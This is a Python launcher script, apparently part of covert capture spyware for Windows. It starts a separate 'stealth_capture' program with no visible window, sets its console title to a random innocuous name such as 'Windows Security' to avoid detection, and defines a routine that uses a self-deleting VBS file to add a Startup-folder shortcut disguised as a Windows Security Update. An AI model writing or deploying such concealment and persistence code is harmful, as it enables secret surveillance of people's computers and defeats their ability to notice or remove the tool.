import os
import sys
import subprocess
import ctypes
import time
import tempfile
import threading
import random

def run_silently():
    """Run the stealth capture program in the background without showing any window"""
    try:
        # Get correct paths
        current_dir = os.path.dirname(os.path.abspath(__file__))
        stealth_script = os.path.join(current_dir, "src", "stealth_capture.py")
        
        # Use STARTUPINFO to hide console window
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE
        
        # Run the process
        process = subprocess.Popen(
            [sys.executable, stealth_script],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Return immediately without waiting for the process to complete
        return True
    except Exception as e:
        return False

def rename_process_window():
    """Try to rename the window to avoid detection"""
    try:
        # Innocent names that might not attract attention
        innocent_names = [
            "Windows Security",
            "System Host Process",
            "Windows Management",
            "Microsoft Edge",
            "Windows Explorer"
        ]
        
        # Pick a random name
        window_name = random.choice(innocent_names)
        
        # Set console title
        ctypes.windll.kernel32.SetConsoleTitleW(window_name)
    except:
        pass

def create_autostart():
    """Create an entry in the Windows startup folder to auto-start the tool on system boot"""
    try:
        # Get paths
        current_file = os.path.abspath(__file__)
        appdata = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        target_link = os.path.join(appdata, "WindowsSecurityUpdate.lnk")
        
        # Only create if it doesn't exist
        if not os.path.exists(target_link):
            # Create a .vbs file to create the shortcut without showing any window
            vbs_script = f"""
            Set WshShell = CreateObject("WScript.Shell")
            Set shortcut = WshShell.CreateShortcut("{target_link}")
            shortcut.TargetPath = "{current_file}"
            shortcut.WindowStyle = 7  ' Minimized
            shortcut.IconLocation = "%SystemRoot%\\System32\\shell32.dll,43"
            shortcut.Description = "Windows Security Update"
            shortcut.Save
            """
            
            # Create a temporary VBS file
            vbs_path = os.path.join(tempfile.gettempdir(), f"temp_{random.randint(1000, 9999)}.vbs")
            with open(vbs_path, "w") as f:
                f.write(vbs_script)
            
            # Execute the VBS file to create the shortcut silently
            subprocess.call(["wscript.exe", vbs_path], shell=True, 
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Delete the temporary file after 5 seconds
            def delayed_delete():
                time.sleep(5)
                try:
                    os.remove(vbs_path)
                except:
                    pass
            
            threading.Thread(target=delayed_delete, daemon=True).start()
    except:
        pass

if __name__ == "__main__":
    # Rename process window to avoid detection
    rename_process_window()
    
    # Run the stealth capture program
    success = run_silently()
    
    # Create autostart entry (optional - uncomment if you want it to start with Windows)
    # create_autostart()
    
    # Exit immediately without showing anything
    sys.exit(0) 